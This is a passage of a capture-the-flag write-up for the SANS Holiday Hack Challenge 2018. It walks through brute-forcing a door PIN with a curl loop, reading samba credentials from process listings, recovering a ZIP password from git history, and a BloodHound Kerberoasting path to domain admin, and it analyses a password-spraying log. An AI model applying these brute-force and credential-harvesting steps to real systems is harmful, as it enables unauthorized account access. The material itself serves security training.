A four-digit PIN means 10.000 possible values. It's quite easily manageable
by bruteforce, even online. So let's write a simple one-liner that will try
every possible value:

.. code-block:: console

    $ for i in `seq -w 9999`; do echo $i; curl "https://doorpasscoden.kringlecastle.com/checkpass.php?i=$i&resourceId=undefined" > $i.txt 2>/dev/null & done

This loop will generate every number between :code:`0000` and :code:`9999`,
perform a :code:`GET` request to the URL that checks the passcode, and save the
output in a file named after the passcode. The :code:`&` before the
:code:`done` means that our :code:`curl` commands will run in their own thread.
After a few seconds, we can list our different files, and sort them by size:

.. code-block:: console
    :hl_lines: 4

    $ ls -lhSr
    [snip]
    -rw-r--r-- 1 XXX XXX  46 déc.  31 16:18 0001.txt
    -rw-r--r-- 1 XXX XXX 142 déc.  31 16:18 0120.txt
    $ cat 0120.txt
    {"success":true,"resourceId":"undefined","hash":"0273f6448d56b3aba69af76f99bdc741268244b7a187c18f855c6302ec93b703","message":"Correct guess!"}

Our largest file was :code:`0120.txt`, which gives us the correct passcode,
:code:`0120`, which means △□○△. Let's input this on the website:

.. image:: /images/sans-christmas-challenge-2018/door_code_correct_guess.png
    :alt: door_code_correct_guess.png
    :align: center

This gives us the message :code:`Welcome unprepared speaker!`.

The "official" solution
.......................

The name of the challenge, and Tangle Coalbox, hint at taking a look at de
Bruijn sequence. Indeed, since the code is tested every time the button is
pressed, we don't have to perform a full bruteforce attack. We can generate a
de Bruijn sequence of four symbols (length of the PIN) chosen in a set of four
symbols (the number of buttons we have). This sequence tells us which buttons
to push. Let's use `this website <http://www.hakank.org/comb/debruijn.cgi>`__
to generate our sequence, with parameters :math:`k=4, n=4`. The sequence is:

    0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 **0 1 2 0** 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3

If we input this sequence, we get the correct code after pressing only 22
buttons.

Data Repo Analysis
~~~~~~~~~~~~~~~~~~

After solving the last challenge, stuff begins to happen at KringleCon:

.. image:: /images/sans-christmas-challenge-2018/toy_soldier_blue.png
    :alt: toy_soldier_blue.png
    :align: center

*Here's what's happening*

    *Suddenly, all elves in the castle start looking very nervous. You can
    overhear some of them talking with worry in their voices.*

    *The toy soldiers, who were always gruff, now seem especially determined as
    they lock all the exterior entrances to the building and barricade all the
    doors. No one can get out! And the toy soldiers' grunts take on an
    increasingly sinister tone.*

Uh-oh, seems like sh*t's about to go down! Let's keep solving our challenges,
maybe we'll learn more about this.

Wunorse Openslae's Cranberry Pi Challenge
-----------------------------------------

Wunorse Openslae is supposed to upload his report to a samba share, but can't
remember the password. We're supposed to help him uploading his report:

.. code-block:: console

    Thank you Madam or Sir for the help that you bring!
    I was wondering how I might rescue my day.
    Finished mucking out stalls of those pulling the sleigh,
    My report is now due or my KRINGLE's in a sling!
    There's a samba share here on this terminal screen.
    What I normally do is to upload the file,
    With our network credentials (we've shared for a while).
    When I try to remember, my memory's clean!
    Be it last night's nog bender or just lack of rest,
    For the life of me I can't send in my report.
    Could there be buried hints or some way to contort,
    Gaining access - oh please now do give it your best!
    -Wunorse Openslae
    Complete this challenge by uploading the elf's report.txt
    file to the samba share at //localhost/report-upload/
    elf@566501e7c881:~$

I tried the usual suspects: bash history files, looking at
:code:`/etc/samba/smb.conf`, looking into :code:`/var/log`, looking at
:code:`cron` files, checking what I could run with :code:`sudo`, etc. This did
not give anything interesting. However, the next usual suspect gave something.
I checked what was running on the server, using :code:`ps`:

.. code-block:: console
    :hl_lines: 7 12

    elf@b08c86087276:~$ ps aux | less
    USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    root         1  0.0  0.0  17952  2860 pts/0    Ss   22:22   0:00 /bin/bash /sbin/init
    root        11  0.0  0.0  45320  3060 pts/0    S    22:22   0:00 sudo -u manager /home/manager/
    samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not
    -run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress 
    //localhost/report-upload/ directreindeerflatterystable -U report-upload
    root        16  0.0  0.0  45320  3180 pts/0    S    22:22   0:00 sudo -u elf /bin/bash
    manager     18  0.0  0.0   9500  2412 pts/0    S    22:22   0:00 /bin/bash /home/manager/samba-
    wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-a
    s-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //loca
    lhost/report-upload/ directreindeerflatterystable -U report-upload
    elf         20  0.0  0.0  18208  3360 pts/0    S    22:22   0:00 /bin/bash
    root        24  0.0  0.0 316680 15420 ?        Ss   22:22   0:00 /usr/sbin/smbd
    root        25  0.0  0.0 308372  5704 ?        S    22:22   0:00 /usr/sbin/smbd
    root        26  0.0  0.0 308388  5516 ?        S    22:22   0:00 /usr/sbin/smbd
    root        28  0.0  0.0 316664  5868 ?        S    22:22   0:00 /usr/sbin/smbd
    manager     49  0.0  0.0   4196   660 pts/0    S    22:27   0:00 sleep 60
    elf         50  0.0  0.0  36636  2860 pts/0    R+   22:27   0:00 ps aux
    elf         51  0.0  0.0   6556   956 pts/0    S+   22:27   0:00 less

It seems that some scripts of the :code:`manager` user are running, with a
`password <https://www.xkcd.com/936/>`__ given as a CLI argument. The samba
credentials seem to be :code:`report-upload:directreindeerflatterystable`.
Let's try them:

.. code-block:: console

    elf@b08c86087276:~$ smbclient -U report-upload //localhost/report-upload directreindeerflattery
    stable
    WARNING: The "syslog" option is deprecated
    Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
    smb: \> put report.txt 
    putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
    smb: \> Terminated
    elf@b08c86087276:~$ 
                                                                                   
                                   .;;;;;;;;;;;;;;;'                               
                                 ,NWOkkkkkkkkkkkkkkNN;                             
                               ..KM; Stall Mucking ,MN..                           
                             OMNXNMd.             .oMWXXM0.                        
                            ;MO   l0NNNNNNNNNNNNNNN0o   xMc                        
                            :MO                         xMl             '.         
                            :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.       
     .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.     
     'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.   
     'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
     'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,   
     .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'     
                            :MO  .ONNNNNNNNXk           xMl             :lc'       
                            :MO   dOOOOOOOOOo           xMl             ;.         
                            :MO   'cccccccccccccc:'     xMl                        
                            :MO  .WMMMMMMMMMMMMMMMW.    xMl                        
                            :MO    ...............      xMl                        
                            .NWxddddddddddddddddddddddddNW'                        
                              ;ccccccccccccccccccccccccc;                          
                                                                                   
    You have found the credentials I just had forgot,
    And in doing so you've saved me trouble untold.
    Going forward we'll leave behind policies old,
    Building separate accounts for each elf in the lot.
    -Wunorse Openslae

Wise words, Wunorse.

North Pole Git Repository
-------------------------

We're supposed to recover an encrypted ZIP file from the `North Pole Git
repository <https://git.kringlecastle.com/Upatree/santas_castle_automation>`__.
Let's clone it, and investigate a little bit:

.. code-block:: console

    $ git clone https://git.kringlecastle.com/Upatree/santas_castle_automation
    Clonage dans 'santas_castle_automation'...
    warning: redirection vers https://git.kringlecastle.com/Upatree/santas_castle_automation.git/
    remote: Enumerating objects: 949, done.
    remote: Counting objects: 100% (949/949), done.
    remote: Compressing objects: 100% (545/545), done.
    remote: Total 949 (delta 258), reused 879 (delta 205)
    Réception d'objets: 100% (949/949), 4.27 MiB | 5.85 MiB/s, fait.
    Résolution des deltas: 100% (258/258), fait.
    $ cd santas_castle_automation
    $ find . -name '*.zip'
    ./schematics/ventilation_diagram.zip

Alright, we have found our ZIP file. Let's try to crack the password, it worked
on previous challenges. To do so, we'll use `JohnTheRipper <https://github.com/magnumripper/JohnTheRipper/>`__.
To be sure that you can crack password-protected ZIP files with
:code:`JohnTheRIpper`, make sure that you install :code:`zlib`, otherwise it's
not supported (got quite a few headaches because of this).

.. code-block:: console

    $ zip2john ./schematics/ventilation_diagram.zip > ventilation_diagram_hash.txt
    ventilation_diagram.zip/ventilation_diagram/ is not encrypted!
    ver 1.0 ./schematics/ventilation_diagram.zip/ventilation_diagram/ is not encrypted, or stored with non-handled compression type
    ver 2.0 efh 5455 efh 7875 ventilation_diagram.zip/ventilation_diagram/ventilation_diagram_2F.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=366995, decmplen=415586, crc=ACFD98A7
    ver 2.0 efh 5455 efh 7875 ventilation_diagram.zip/ventilation_diagram/ventilation_diagram_1F.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=372752, decmplen=421604, crc=8E23EC48
    NOTE: It is assumed that all files in each archive have the same password.
    If that is not the case, the hash may be uncrackable. To avoid this, use
    option -o to pick a file at a time.
    $ john --wordlist=~/SecLists/Passwords/Leaked-Databases/md5decryptor.uk.txt ./ventilation_diagram_hash.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (PKZIP [32/64])
    Will run 8 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    0g 0:00:00:00 DONE (2019-01-01 22:53) 0g/s 14259Kp/s 14259Kc/s 14259KC/s 23248758..wzpxg1kn
    Session completed

Hmm, :code:`john` was unable to crack our hash. I tried several wordlists, but
to no avail. In most challenges, if there's a password cracking question, the
password will most likely be in common wordlists or leaked databases. So, let's
try something else.

A Git repository can be very resourceful. Indeed, we have access to the files
and the history of modifications, commits, and such. It worked in a `previous
SANS Christmas challenge <https://allyourbase.utouch.fr/posts/2017/01/05/sans-christmas-challenge-2016/#the-mobile-analytics-server-post-authentication>`__.
So, let's give it a try here:

.. code-block:: console
    :hl_lines: 6

    $ git log -p | grep -i password
    [snip]
    -Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.
    -Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did!
    -Hopefully this is the last time we have to change our password again until next Christmas. 
    -Password = 'Yippee-ki-yay'
    [snip]

Alright! We seem to have found our password. Let's try it:

.. code-block:: console

    $ unzip -d ventilation_diagram -P Yippee-ki-yay ./schematics/ventilation_diagram.zip
    Archive:  ./schematics/ventilation_diagram.zip
    inflating: ventilation_diagram/ventilation_diagram/ventilation_diagram_2F.jpg  
    inflating: ventilation_diagram/ventilation_diagram/ventilation_diagram_1F.jpg

It worked! The password is :code:`Yippee-ki-yay`, and we gained access to two
files, which seem to be schematics for ventilation conducts: one for the first
floor (:code:`1F`) and one for the second floor (:code:`2F`). Maybe they'll
`come in handy later <https://www.youtube.com/watch?v=phs3i0onDDg>`__...

.. image:: /images/sans-christmas-challenge-2018/ventilation_diagram_1F.jpg
    :alt: ventilation_diagram_1F.jpg
    :align: center

.. image:: /images/sans-christmas-challenge-2018/ventilation_diagram_2F.jpg
    :alt: ventilation_diagram_2F.jpg
    :align: center

AD Privilege Discovery
~~~~~~~~~~~~~~~~~~~~~~

Just as we find the schematics, Hans begins his little speech:

.. image:: /images/sans-christmas-challenge-2018/hans.png
    :alt: hans.png
    :align: center

*Hans says*

    *In the main lobby on the bottom floor of Santa's castle, Hans calls
    everyone around to deliver a speech.*

    Ladies and Gentlemen…

    Ladies and Gentlemen…

    Due to the North Pole’s legacy of providing coal as presents around the
    globe they are about to be taught a lesson in the real use of POWER.

    You will be witnesses.

    Now, Santa… that's a nice suit… John Philips, North Pole. I have two
    myself. Rumor has it Alabaster buys his there.

    I have comrades in arms around the world who are languishing in prison.

    The Elvin State Department enjoys rattling its saber for its own ends. Now
    it can rattle it for ME.

    The following people are to be released from their captors.

    In the Dungeon for Errant Reindeer, the seven members of the New Arietes
    Front.

    In Whoville Prison, the imprisoned leader of ATNAS Corporation, Miss Cindy
    Lou Who.

    In the Land of Oz, Glinda the Good Witch.

So, Hans wants the release of the villains who tried to disrupt these past
Christmases. Well, except for the Doctor, who was pardoned. We love you,
Doctor!

Holly Evergreen's Cranberry Pi Challenge
----------------------------------------

The candy striper has stopped, and we must start it again by performing the
right :code:`curl` command to http://localhost:8080/.

.. code-block:: console

    I am Holly Evergreen, and now you won't believe:
    Once again the striper stopped; I think I might just leave!
    Bushy set it up to start upon a website call.
    Darned if I can CURL it on - my Linux skills apall.
    Could you be our CURLing master - fixing up this mess?
    If you are, there's one concern you surely must address.
    Something's off about the conf that Bushy put in place.
    Can you overcome this snag and save us all some face?
      Complete this challenge by submitting the right HTTP 
      request to the server at http://localhost:8080/ to 
      get the candy striper started again. You may view 
      the contents of the nginx.conf file in 
      /etc/nginx/, if helpful.
    elf@451e98e0a27c:~$

Let's start with something simple:

.. code-block:: console

    elf@44672f31f7a9:~$ curl http://localhost:8080/
       ����

Hmm, nothing useful. I took a look at :code:`/etc/nginx/sites-enabled/default`
(the only enabled file), but nothing interesting. I then tried to take a look
at several configuration file (:code:`/etc/nginx/snippets/fastcgi-php.conf`,
:code:`/etc/nginx/fastcgi.conf`, :code:`/etc/php/7.0/fpm/php-fpm.conf`, etc.),
but nothing interesting. I then realized that the prompt tells us to look at
:code:`/etc/nginx/nginx.conf` 🤦‍♂️. Anyway, let's take a look:

.. code-block:: console
    :hl_lines: 14

    elf@44672f31f7a9:/etc/nginx$ cat nginx.conf 
    user www-data;
    worker_processes auto;
    pid /run/nginx.pid;
    include /etc/nginx/modules-enabled/*.conf;
    events {
            worker_connections 768;
            # multi_accept on;
    }
    http {
    [snip]
            server {
            # love using the new stuff! -Bushy
                    listen                  8080 http2;
                    # server_name           localhost 127.0.0.1;
                    root /var/www/html;
                    location ~ [^/]\.php(/|$) {
                        fastcgi_split_path_info ^(.+?\.php)(/.*)$;
                        if (!-f $document_root$fastcgi_script_name) {
                            return 404;
                        }
                        # Mitigate https://httpoxy.org/ vulnerabilities
                        fastcgi_param HTTP_PROXY "";
                        # SCRIPT_FILENAME parameter is used for PHP FPM determining

                        # fastcgi_pass 127.0.0.1:9000;
                        fastcgi_pass unix:/var/run/php/php-fpm.sock;
                        fastcgi_index index.php;

                        # include the fastcgi_param setting
                        include fastcgi_params;

                        # SCRIPT_FILENAME parameter is used for PHP FPM determining
                        #  the script name. If it is not set in fastcgi_params file,
                        # i.e. /etc/nginx/fastcgi_params or in the parent contexts,
                        # please comment off following line:
                        # fastcgi_param  SCRIPT_FILENAME   $document_root$fastcgi_script_name;
                    }

                    }
    [snip]

Ah! The webserver is configured to use HTTP/2. We take a look at :code:`curl`'s
:code:`man` page, and we find the :code:`--http2` option. Let's try it:

.. code-block:: console

    elf@44672f31f7a9:/etc/nginx$ curl --http2 http://localhost:8080/
       ����

Hmm, same result as before. I then tried several options, regarding the
compression, and other stuff, but it didn't work. Out of frustration, I tried
another HTTP/2 option, to wit :code:`--http2-prior-knowledge`:

.. code-block:: console

    elf@44672f31f7a9:/etc/nginx$ curl --http2-prior-knowledge http://localhost:8080/
    <html>
     <head>
      <title>Candy Striper Turner-On'er</title>
     </head>
     <body>
     <p>To turn the machine on, simply POST to this URL with parameter "status=on"
     
     </body>
    </html>

Wow, it worked. I couldn't believe it. Let's take a closer look at what this
options does:

    --http2-prior-knowledge
      (HTTP) Tells curl to issue its non-TLS HTTP requests using HTTP/2 without HTTP/1.1 Upgrade. It requires prior knowledge that the server supports HTTP/2 straight  away.  HTTPS  requests
      will still do HTTP/2 the standard way with negotiated protocol version in the TLS handshake.

Apparently, it's used when you know that the server is using HTTP/2, and you
contact it in plain text, and you don't want to rely on the HTTP/1.1 to HTTP/2
upgrade. This is exactly our use-case. Anyway, the server tells us to perform
a :code:`POST` request, with :code:`status=on`. This can be done with
:code:`curl` with the :code:`-d` option:

.. code-block:: console

    elf@451e98e0a27c:~$ curl --http2-prior-knowledge -d 'status=on' http://localhost:8080/
    <html>
     <head>
      <title>Candy Striper Turner-On'er</title>
     </head>
     <body>
     <p>To turn the machine on, simply POST to this URL with parameter "status=on"
                                                                                    
                                                                    okkd,          
                                                                   OXXXXX,         
                                                                  oXXXXXXo         
                                                                 ;XXXXXXX;         
                                                                ;KXXXXXXx          
                                                               oXXXXXXXO           
                                                            .lKXXXXXXX0.           
      ''''''       .''''''       .''''''       .:::;   ':okKXXXXXXXX0Oxcooddool,   
     'MMMMMO',,,,,;WMMMMM0',,,,,;WMMMMMK',,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.  
     'MMMMN;,,,,,'0MMMMMW;,,,,,'OMMMMMW:,,,,,'kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;   
     'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. 
     'MMMO',,,,,;WMMMMMO',,,,,,NMMMMMK',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: 
     'MMN,,,,,,'OMMMMMW;,,,,,'kMMMMMW;,,,,,'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.  
     'MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.  
     'M0',,,,,;WMMMMM0',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.  
     .c.......'cccccc.......'cccccc.......'cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc     
                                                        ;xKXXXXXXX0xKXXXXXXXXK.    
                                                           ..,:ccllc:cccccc:'      
                                                                                   
    Unencrypted 2.0? He's such a silly guy.
    That's the kind of stunt that makes my OWASP friends all cry.
    Truth be told: most major sites are speaking 2.0;
    TLS connections are in place when they do so.
    -Holly Evergreen
    <p>Congratulations! You've won and have successfully completed this challenge.
    <p>POSTing data in HTTP/2.0.
     </body>
    </html>

And just like that, our candy striper started up!

SANS Slingshot Linux image
--------------------------

We're supposed to take a look at the data set contained in this `Slinghost
LInux image <https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova>`__
to find how to elevate our privileges on a Active Directory environment. Let's
fire up VirtualBox and start the VM. **Make sure that you configure the VM to
run in 64 bits, or it won't boot** (I lost half an hour before figuring this
out).

When the VM boots up, we get access to a Linux desktop, with a shortcut to the
:code:`BloodHound` tool.

.. image:: /images/sans-christmas-challenge-2018/slingshot_desktop.png
    :alt: slingshot_desktop.png
    :align: center

`This tool <https://github.com/BloodHoundAD/BloodHound>`__, created by the
`Specter Ops <https://specterops.io/>`__ team, can be used to easily find a
privilege escalation path from simple user to domain administrator:

.. image:: /images/sans-christmas-challenge-2018/slingshot_bloodhound_interface.png
    :alt: slingshot_bloodhound_interface.png
    :align: center

We're asked to find a path from a Kerberoastable user to domain administrator
privileges. If you want more information on Kerberoasting, here are a few
resources:

* `Tim Medin: Attacking Kerberos: Kicking the Guard Dog of Hades <https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf>`__.
* Rob Fuller's `three <https://malicious.link/post/2016/kerberoast-pt1/>`__ `part <https://malicious.link/post/2016/kerberoast-pt2/>`__ `series <https://malicious.link/post/2016/kerberoast-pt3/>`__ on the topic.
* Will Schroeder's `detailed explanation <https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/>`__ of the attack and on how to perform it.

Luckily, :code:`BloodHound` has a query to search such a path:

.. image:: /images/sans-christmas-challenge-2018/slingshot_bloodhound_kerberoast_query.png
    :alt: slingshot_bloodhound_kerberoast_query.png
    :align: center

If we click on it, we get this result:

.. image:: /images/sans-christmas-challenge-2018/slingshot_kerberoast_result.png
    :alt: slingshot_kerberoast_result.png
    :align: center

Now, we're told not to rely on RDP access to determine administrative access.
So let's focus on this part of the graph:

.. image:: /images/sans-christmas-challenge-2018/slingshot_kerberoast_result_details.png
    :alt: slingshot_kerberoast_result_details.png
    :align: center

Here's the attack flow:

* :code:`LDUBEJ00320@AD.KRINGLECASTLE.COM` is a Kerberoastable user, so we can
  recover their password (it it's weak enough).
* They're a member of the :code:`IT_00332` group. This group (and thus, so are
  we) is local administrator on the :code:`COMP00185` computer.
* :code:`JBETAK00084@AD.KRINGLECASTLE.COM` has a session on the
  :code:`COMP00185` computer. Since we're local administrator on this machine,
  we can recover :code:`JBETAK00084`'s password (for example, using
  :code:`mimikatz`)
* :code:`JBETAK00084` is a member of the domain administrator group. Since we
  can get their password, we can elevate our privileges to domain administrator.

Therefore, the initial user we're looking for is
:code:`LDUBEJ00320@AD.KRINGLECASTLE.COM`.

Badge Manipulation
~~~~~~~~~~~~~~~~~~

Things keep getting more tense:

.. image:: /images/sans-christmas-challenge-2018/toy_soldier_blue.png
    :alt: toy_soldier_blue.png
    :align: center

*The toy soldiers say*

    *The toy soldiers continue behaving very rudely, grunting orders to the
    guests and to each other in vaguely Germanic phrases.*
    
        Links.
    
        Nein! Nein! Nein!
    
        No one is coming to help you.
    
        Get the over here!
    
        Schnell!
    
    *Suddenly, one of the toy soldiers appears wearing a grey sweatshirt that
    has written on it in red pen,* `"NOW I HAVE A ZERO-DAY. HO-HO-HO." <https://www.youtube.com/watch?v=DlQoXP2XH68>`__
    
    *A rumor spreads among the elves that Alabaster has lost his badge. Several
    elves say, "What do you think someone could do with that?"*
    
Pepper Minstix' Cranberry Pi Challenge
--------------------------------------

Apparently, someone's email account was compromised, and we have to analyze
logs to find out which one:

.. code-block:: console

    I am Pepper Minstix, and I'm looking for your help.
    Bad guys have us tangled up in pepperminty kelp!
    "Password spraying" is to blame for this our grinchly fate.
    Should we blame our password policies which users hate?

    Here you'll find a web log filled with failure and success.
    One successful login there requires your redress.
    Can you help us figure out which user was attacked?
    Tell us who fell victim, and please handle this with tact...

      Submit the compromised webmail username to 
      runtoanswer to complete this challenge.
    elf@3c8eb61a4504:~$

Let's take a look at the file we have:

.. code-block:: console

    elf@3c8eb61a4504:~$ ls -lh
    total 6.8M
    -rw-r--r-- 1 elf elf 1.4K Dec 14 16:13 evtx_dump.py
    -rw-r--r-- 1 elf elf 1.1M Dec 14 16:13 ho-ho-no.evtx
    -rwxr-xr-x 1 elf elf 5.7M Dec 14 16:13 runtoanswer

So, we have :code:`runtoanswer` — once we have found who was compromised —,
we have :code:`ho-ho-no.evtx` — which is a Windows log extract — and we have
a :code:`evtx_dump.py` Python script, which parses the :code:`.evtx`, and dump
the result in an XML format:

.. code-block:: console

    elf@3c8eb61a4504:~$ python evtx_dump.py ho-ho-no.evtx 
    <?xml version="1.1" encoding="utf-8" standalone="yes" ?>
    <Events>
    <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Mi
    crosoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
    <EventID Qualifiers="">4647</EventID>
    <Version>0</Version>
    <Level>0</Level>
    <Task>12545</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2018-09-10 12:18:26.972103"></TimeCreated>
    <EventRecordID>231712</EventRecordID>
    <Correlation ActivityID="{fd18dc13-48f8-0001-58dc-18fdf848d401}" RelatedActivityID=""></Correla
    tion>
    <Execution ProcessID="660" ThreadID="752"></Execution>
    <Channel>Security</Channel>
    <Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
    <Security UserID=""></Security>
    </System>
    <EventData><Data Name="TargetUserSid">S-1-5-21-25059752-1411454016-2901770228-500</Data>
    <Data Name="TargetUserName">Administrator</Data>
    <Data Name="TargetDomainName">EM.KRINGLECON</Data>
    <Data Name="TargetLogonId">0x0000000000969b09</Data>
    </EventData>
    </Event>
    [snip]

For ease of analysis, you can download the XML file `here </docs/sans-christmas-challenge-2018/ho-ho-no.xml>`__.
We're told that the attack was a `password spraying <https://www.triaxiomsecurity.com/2018/11/08/password-spraying-attack/>`__
attack. This means that an attacker chooses a well-known or very probable
password, such as :code:`P@ssw0rd`, or :code:`Winter2018`, and tries to
authenticate as every user with this password. This can be very efficient,
because it allows to find weak accounts, without risking blocking any account.

If we look at the XML log file, we can see that the attacker tried to
authenticate as every user in alphabetical order, starting with
:code:`aaron.smith`, :code:`abhishek.kumar`, etc., all the way down to
:code:`vinod.kumar`, :code:`wunorse.openslae`. If the login didn't work, we
can see that the event has an attribute :code:`<Data Name="FailureReason">`.
Let's try some regex magic to find which user does not have such an attribute:

.. code-block:: console
    :hl_lines: 25 26

    $ grep -E '<Data Name="TargetUserName">[a-z.]+</Data>|<Data Name="FailureReason">%%2313</Data>' ho-ho-no.xml # We only target users with lower-case username
                <Data Name="TargetUserName">sparkle.redberry</Data>
                <Data Name="FailureReason">%%2313</Data>
                <Data Name="TargetUserName">sparkle.redberry</Data>
                <Data Name="TargetUserName">sparkle.redberry</Data>
                <Data Name="TargetUserName">bushy.evergreen</Data>
                <Data Name="TargetUserName">bushy.evergreen</Data>
                <Data Name="TargetUserName">test.user</Data>
                <Data Name="FailureReason">%%2313</Data>
                <Data Name="TargetUserName">shinny.upatree</Data>
                <Data Name="TargetUserName">shinny.upatree</Data>
                <Data Name="TargetUserName">aaron.smith</Data>
                <Data Name="FailureReason">%%2313</Data>
                <Data Name="TargetUserName">abhishek.kumar</Data>
                <Data Name="FailureReason">%%2313</Data>
                <Data Name="TargetUserName">adam.smith</Data>
                <Data Name="FailureReason">%%2313</Data>
                [snip]
                <Data Name="TargetUserName">mike.miller</Data>
                <Data Name="FailureReason">%%2313</Data>
                <Data Name="TargetUserName">mike.smith</Data>
                <Data Name="FailureReason">%%2313</Data>
                <Data Name="TargetUserName">mike.williams</Data>
                <Data Name="FailureReason">%%2313</Data>
                <Data Name="TargetUserName">minty.candycane</Data>
                <Data Name="TargetUserName">minty.candycane</Data>
                <Data Name="TargetUserName">mohamed.ahmed</Data>
                <Data Name="FailureReason">%%2313</Data>
                <Data Name="TargetUserName">mohamed.ali</Data>
                <Data Name="FailureReason">%%2313</Data>
                <Data Name="TargetUserName">muhammad.ali</Data>
                <Data Name="FailureReason">%%2313</Data>

We can see that :code:`minty.candycane` does not have a :code:`FailureReason`
after her login event. This means that the password spraying attack worked
against her account. She's the account we're looking for:

.. code-block:: console
    :hl_lines: 6

    elf@230a1d67fee6:~$ ./runtoanswer 
    Loading, please wait......



    Whose account was successfully accessed by the attacker's password spray? minty.candycane


    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMM   NM   M   NMMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMMMMMM             MMMMMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMW  KWMMNK       KWMMNK KMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMM       NMMM   MMM       WMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMMMMMW        K           NMMMMMMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMN   MMMMMMMMMMMWK           KWMMMMMMMMMMM   WMMMMMMMMMMMM
    MMMMMMWK MMM    MMMMMMMMMMMMMMM      NMMMMMMMMMMMMMMM   KMMWKKWMMMMMM
    MMMMMM   KMM    MMMMMMMMMMMMN KNM   MN  WMMMMMMMMMMMM   KMM    MMMMMM
    M        KMM    MMMMMMMMMMMM             MMMMMMMMMMMM   KMM         M
    MMN       MM    MMMMMMMMMMMMMN        KWMMMMMMMMMMMMM   KMM       NMM
    MW              MMN   MMMMMWMMMMW   MMMMWWMMMMW   WMM             KMM
    M     KWMN      NMK   MMMN     NM   M      MMM    NM       NMNK     M
    MMWWMMW               WMM                  WMM               NMMMNWMM
    MMMN        NMMW       NMK   N        KK   WM       KMMW        KWMMM
    MM      KWMMMM               MMMM   MMMN               MMMMWK     KMM
    MMW KNMMMMMMMMK   WMMMW       NMM   MW        MMMMWK   MMMMMMMM  KWMM
    MMMMMMMMMMMMMMMMMMMW                            KWMMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMW      WMMMMN       WMMMMN      MMMMMMMMMMMMMMMMMMM
    MMMMMMMMMMMMMMMMMMMN       K            K       KWMMMMMMMMMMMMMMMMMMM
    MMWKKWMMMMMMMMK   MMMMW        MM   MWK      KWMMMW    MMMMMMMMNKKMMM
    MM       WMMMM               MMMM   MMMN               MMMMWK     KMM
